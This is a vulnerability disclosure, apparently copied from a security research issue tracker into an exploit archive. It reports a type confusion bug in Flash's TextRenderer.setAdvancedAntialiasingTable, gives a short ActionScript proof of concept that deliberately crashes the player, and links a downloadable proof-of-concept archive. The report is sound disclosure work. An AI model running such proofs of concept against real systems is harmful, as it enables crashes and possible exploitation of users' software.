@@ -1,0 +1,17 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=409&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id
+
+There is a type confusion issue in TextRenderer.setAdvancedAntialiasingTable. If the font, insideCutoff or outsideCutoff are set to objects that are not integers, they are still assumed to be integers. A proof-of-concept is below:
+
+var antiAliasEntry_1 = {fontSize:10, insideCutoff:1.61, outsideCutoff:-3.43};
+var antiAliasEntry_2 = {fontSize:"", insideCutoff:0.8, outsideCutoff:-0.8};
+var arialTable:Array = new Array(antiAliasEntry_1, antiAliasEntry_2);
+
+TextRenderer.setAdvancedAntialiasingTable("Arial", "none", "dark", arialTable);
+
+This issue is low-impact because the type-confused objects are read into the font and cutoff values, which cannot be directly retreived from script. It is probably possible to determine the value read by doing hit tests on the text that is rendered (to see how big and clipped it is), but this would be fairly difficult.
+
+A sample SWF and fla are attached, these samples intentionally crash to demonstrate the issue. 
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37874.zip
+
